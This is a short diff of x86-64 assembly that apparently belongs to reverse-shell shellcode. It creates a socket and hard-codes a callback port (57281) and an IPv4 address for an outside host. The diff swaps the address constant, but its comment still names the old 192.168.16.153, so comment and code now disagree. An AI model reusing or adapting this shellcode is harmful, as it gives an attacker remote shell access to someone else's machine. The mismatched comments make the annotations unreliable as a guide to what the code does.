@@ -14,8 +14,8 @@ push 41
 pop rax ; sys_socket
 syscall
 sub rsp, 8
-mov dword [rsp], 0xc1df0002 ; Port 4444, 4Bytes: 0xPORT + Fill with '0's + 2
-mov dword [rsp+4], 0x9910a8c0 ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
+mov dword [rsp], 0xc1df0002 ; Port 57281, 4Bytes: 0xPORT + Fill with '0's + 2
+mov dword [rsp+4], 0x7f0610ac ; IP Address 192.168.16.153, 4Bytes: 0xIPAddress (Little Endiannes)
 lea rsi, [rsp]
 add rsp, 8
 pop rbx
